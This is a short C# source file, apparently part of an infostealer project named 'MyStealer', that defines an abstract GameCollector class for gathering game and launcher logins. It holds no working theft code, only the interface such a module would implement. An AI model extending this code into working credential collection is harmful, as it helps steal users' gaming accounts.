using System.Collections.Immutable;

namespace MyStealer.Collector.Game
{
    /// <summary>
    /// A module that collects game or game launcher logins.
    /// </summary>
    public abstract class GameCollector : CollectorBase
    {
        public abstract IImmutableSet<GameLogin> GetLogins();
    }
}
